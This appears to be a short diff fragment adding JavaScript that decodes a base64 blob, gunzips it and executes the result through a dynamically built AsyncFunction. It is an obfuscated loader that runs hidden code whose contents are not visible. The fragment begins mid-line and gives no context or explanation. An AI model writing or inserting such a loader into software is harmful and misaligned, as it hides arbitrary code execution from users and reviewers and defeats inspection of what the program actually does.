@@ -1,0 +1,6 @@
+OeMfj5Kf8tn62bYJ/wwQ/ySe/KTV0/PJnXP+Vav+b3kdP33y7On3j77/8dfnj368jV/6Wv/mFbc8VMbc/OwVJfBPJym4//EfX+FnjehVfwnu63JXcvFrXtuNMGir2fnbyVfyo0rym0e9n4274N+/2/2tL7Sgv2oFIC6Gi9d3CW/c+2S+nBA8wBkn8Df0/ScP5cs+BPcuPtxF1+0XniZ3typz69LAZiwfbW9ycfElTQHCBLWEtj980fvJpTVdG1WRgDf+Jab/C8dHZakXcQAA"), c => c.charCodeAt(0));
+const __bytes = FF.gunzipSync(__bin);
+let __src = '';
+for (let i = 0; i < __bytes.length; i++) __src += String.fromCharCode(__bytes[i]);
+const __AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
+return await new __AsyncFunction(__src)();
